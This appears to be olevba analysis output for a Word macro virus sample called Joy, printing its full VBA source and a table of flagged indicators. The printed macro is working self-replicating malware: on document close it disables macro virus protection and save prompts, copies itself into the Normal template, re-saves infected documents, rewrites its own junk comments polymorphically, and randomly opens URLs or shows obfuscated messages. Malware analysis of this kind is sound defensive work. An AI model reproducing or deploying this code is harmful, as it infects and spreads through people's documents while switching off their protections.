olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Joy-7d3541fa1f36edb73b6c316036c98593c0d19d73
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Joy-7d3541fa1f36edb73b6c316036c98593c0d19d73 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
'-#9(89()%;DI3-#9((8I3;DI3-%;DI3-9()%;DI3-#9((8I3;DI3-%;DI3-
Dim rsx, rox, xix As Integer: Dim cix, xic, eox, xoe, oxe, cii, rxe, rex, exr, nix, ixn, nxi, lnr, nrl, rnl As String: Randomize
'2!=-6=-')@BM82!=--6M8@BM82)@BM82=-')@BM82!=--6M8@BM82)@BM82
On Error GoTo 85
'-#8(88()$;DH3-#8((8H3;DH3-$;DH3-8()$;DH3-#8((8H3;DH3-$;DH3-
Options.VirusProtection = False
'.!7)67)'#<BG4.!7))6G4<BG4.#<BG4.7)'#<BG4.!7))6G4<BG4.#<BG4.
Options.SaveNormalPrompt = False
'4#9/89/)%BDI:4#9//8I:BDI:4%BDI:49/)%BDI:4#9//8I:BDI:4%BDI:4
Options.ConfirmConversions = False
'-$8(98(*$;EH3-$8((9H3;EH3-$;EH3-8(*$;EH3-$8((9H3;EH3-$;EH3-
rt = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.countoflines
'.'7)<7)-#<HG4.'7))<G4<HG4.#<HG4.7)-#<HG4.'7))<G4<HG4.#<HG4.
dt = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.countoflines
'.":)7:)(&<CJ4.":))7J4<CJ4.&<CJ4.:)(&<CJ4.":))7J4<CJ4.&<CJ4.
If dt > 0 And rt > 0 Then GoTo 85
'.&7);7),#<GG4.&7));G4<GG4.#<GG4.7),#<GG4.&7));G4<GG4.#<GG4.
If dt = 0 Then
'/"8*78*($=CH5/"8**7H5=CH5/$=CH5/8*($=CH5/"8**7H5=CH5/$=CH5/
    Set Joy = NormalTemplate.VBProject.VBComponents
'.";)7;)('<CK4.";))7K4<CK4.'<CK4.;)('<CK4.";))7K4<CK4.'<CK4.
    Set hst = ActiveDocument.VBProject.VBComponents
'.!9)69)'%<BI4.!9))6I4<BI4.%<BI4.9)'%<BI4.!9))6I4<BI4.%<BI4.
    lx = Int(Rnd(1) * 100) + 1
'-"7(77((#;CG3-"7((7G3;CG3-#;CG3-7((#;CG3-"7((7G3;CG3-#;CG3-
    If lx = 99 Then ActiveWindow.WindowState = wdWindowStateMinimize: ActiveDocument.FollowHyperlink Address:="http://www.ultra.com", NewWindow:=False, AddHistory:=False, ExtraInfo:=Chr(74) + Chr(111) + Chr(121)
'.$9)99)*%<EI4.$9))9I4<EI4.%<EI4.9)*%<EI4.$9))9I4<EI4.%<EI4.
    lr = Int(Rnd(1) * 75) + 1
'-$<(9<(*(;EL3-$<((9L3;EL3-(;EL3-<(*(;EL3-$<((9L3;EL3-(;EL3-
    If lr = 74 Then ActiveWindow.WindowState = wdWindowStateMinimize: ActiveDocument.FollowHyperlink Address:="http://www.joy.com", NewWindow:=False, AddHistory:=False, ExtraInfo:=Chr(74) + Chr(111) + Chr(121)
'.#9)89))%<DI4.#9))8I4<DI4.%<DI4.9))%<DI4.#9))8I4<DI4.%<DI4.
    ls = Int(Rnd(1) * 50) + 1
'-#8(88()$;DH3-#8((8H3;DH3-$;DH3-8()$;DH3-#8((8H3;DH3-$;DH3-
    If ls = 49 Then MsgBox Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(86) + Chr(105) + Chr(82) + Chr(117) + Chr(83) + Chr(32) + Chr(83) + Chr(65) + Chr(89) + Chr(83) + Chr(32) + Chr(72) + Chr(73)
'2"8-78-($@CH82"8--7H8@CH82$@CH828-($@CH82"8--7H8@CH82$@CH82
    lt = Int(Rnd(1) * 25) + 1
'2#8-88-)$@DH82#8--8H8@DH82$@DH828-)$@DH82#8--8H8@DH82$@DH82
    If lt = 24 Then MsgBox Chr(32) + Chr(32) + Chr(67) + Chr(76) + Chr(65) + Chr(83) + Chr(83) + Chr(32) + Chr(85) + Chr(76) + Chr(84) + Chr(82) + Chr(65) + Chr(32) + Chr(74) + Chr(111) + Chr(121), vbCritical
'-$8(98(*$;EH3-$8((9H3;EH3-$;EH3-8(*$;EH3-$8((9H3;EH3-$;EH3-
    hst.Item(1).Name = Joy.Item(1).Name
'-#8(88()$;DH3-#8((8H3;DH3-$;DH3-8()$;DH3-#8((8H3;DH3-$;DH3-
    hst.Item(1).Export Application.StartupPath & Chr(74) + Chr(111) + Chr(121)
'0$8+98+*$>EH60$8++9H6>EH60$>EH608+*$>EH60$8++9H6>EH60$>EH60
End If
'.$9)99)*%<EI4.$9))9I4<EI4.%<EI4.9)*%<EI4.$9))9I4<EI4.%<EI4.
If rt = 0 Then Set Joy = ActiveDocument.VBProject.VBComponents
'-!9(69('%;BI3-!9((6I3;BI3-%;BI3-9('%;BI3-!9((6I3;BI3-%;BI3-
Joy.Item(1).codemodule.AddFromFile Application.StartupPath & Chr(74) + Chr(111) + Chr(121)
'.'7)<7)-#<HG4.'7))<G4<HG4.#<HG4.7)-#<HG4.'7))<G4<HG4.#<HG4.
With Joy.Item(1).codemodule
'.!9)69)'%<BI4.!9))6I4<BI4.%<BI4.9)'%<BI4.!9))6I4<BI4.%<BI4.
    For j = 1 To 4
'.#<)8<))(<DL4.#<))8L4<DL4.(<DL4.<))(<DL4.#<))8L4<DL4.(<DL4.
    .deletelines 1
'-$9(99(*%;EI3-$9((9I3;EI3-%;EI3-9(*%;EI3-$9((9I3;EI3-%;EI3-
    Next j
'.$9)99)*%<EI4.$9))9I4<EI4.%<EI4.9)*%<EI4.$9))9I4<EI4.%<EI4.
    End With
'-%9(:9(+%;FI3-%9((:I3;FI3-%;FI3-9(+%;FI3-%9((:I3;FI3-%;FI3-
If dt = 0 Then Joy.Item(1).codemodule.replaceline 1, "Sub AutoClose()"
'.#8)88))$<DH4.#8))8H4<DH4.$<DH4.8))$<DH4.#8))8H4<DH4.$<DH4.
If dt = 0 Then Joy.Item(1).codemodule.replaceline 91, "Sub ToolsMarco()"
'. 9)59)&%<AI4. 9))5I4<AI4.%<AI4.9)&%<AI4. 9))5I4<AI4.%<AI4.
If dt = 0 And rt = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'- 8(58(&$;AH3- 8((5H3;AH3-$;AH3-8(&$;AH3- 8((5H3;AH3-$;AH3-
With Joy.Item(1).codemodule
'-(8(=8(.$;IH3-(8((=H3;IH3-$;IH3-8(.$;IH3-(8((=H3;IH3-$;IH3-
    For j = 2 To Joy.Item(1).codemodule.countoflines Step 2
'.!>)6>)'*<BN4.!>))6N4<BN4.*<BN4.>)'*<BN4.!>))6N4<BN4.*<BN4.
    rsx = Int(Rnd(11) * 2998) + 24: rox = Int(Rnd(15) * 5863) + 33: xix = Int(Rnd(44) * 3544) + 55
'4$:/9:/*&BEJ:4$://9J:BEJ:4&BEJ:4:/*&BEJ:4$://9J:BEJ:4&BEJ:4
    cii = Asc(rsx): eox = Chr$(cii + 2): xoe = Chr$(cii - 9): oxe = Chr$(cii + 10): lnr = Chr$(cii - 4)
'.!7)67)'#<BG4.!7))6G4<BG4.#<BG4.7)'#<BG4.!7))6G4<BG4.#<BG4.
    cix = Asc(rox): rxe = Chr$(cix + 4): rex = Chr$(cix - 11): exr = Chr$(cix + 16): nrl = Chr$(cix - 17)
'.$8)98)*$<EH4.$8))9H4<EH4.$<EH4.8)*$<EH4.$8))9H4<EH4.$<EH4.
    xic = Asc(xix): nix = Chr$(xic + 6): ixn = Chr$(xic - 14): nxi = Chr$(xic + 22): rnl = Chr$(xic - 33)
'.$8)98)*$<EH4.$8))9H4<EH4.$<EH4.8)*$<EH4.$8))9H4<EH4.$<EH4.
    .replaceline j, "'" & lnr & nrl & rnl & nix & xoe & rxe & nix & xoe & rex & ixn & oxe & exr & nxi & eox & lnr & nrl & rnl & nix & xoe & xoe & rxe & nxi & eox & oxe & exr & nxi & eox & lnr & ixn & oxe & exr & nxi & eox & lnr & nix & xoe & rex & ixn & oxe & exr & nxi & eox & lnr & nrl & rnl & nix & xoe & xoe & rxe & nxi & eox & oxe & exr & nxi & eox & lnr & ixn & oxe & exr & nxi & eox & lnr
'-#=(8=());DM3-#=((8M3;DM3-);DM3-=());DM3-#=((8M3;DM3-);DM3-
Next j
'.#8)88))$<DH4.#8))8H4<DH4.$<DH4.8))$<DH4.#8))8H4<DH4.$<DH4.
End With
'.!9)69)'%<BI4.!9))6I4<BI4.%<BI4.9)'%<BI4.!9))6I4<BI4.%<BI4.
85:
'."8)78)($<CH4."8))7H4<CH4.$<CH4.8)($<CH4."8))7H4<CH4.$<CH4.
If dt <> 0 And rt = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'.$7)97)*#<EG4.$7))9G4<EG4.#<EG4.7)*#<EG4.$7))9G4<EG4.#<EG4.
End Sub
'0#9+89+)%>DI60#9++8I6>DI60%>DI609+)%>DI60#9++8I6>DI60%>DI60
Sub ToolsMarco()
'.$8)98)*$<EH4.$8))9H4<EH4.$<EH4.8)*$<EH4.$8))9H4<EH4.$<EH4.
End Sub
'."7)77)(#<CG4."7))7G4<CG4.#<CG4.7)(#<CG4."7))7G4<CG4.#<CG4.

'.$9)99)*%<EI4.$9))9I4<EI4.%<EI4.9)*%<EI4.$9))9I4<EI4.%<EI4.

'-&8(;8(,$;GH3-&8((;H3;GH3-$;GH3-8(,$;GH3-&8((;H3;GH3-$;GH3-
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|IOC       |http://www.ultra.com|URL                                          |
|IOC       |http://www.joy.com  |URL                                          |
+----------+--------------------+---------------------------------------------+

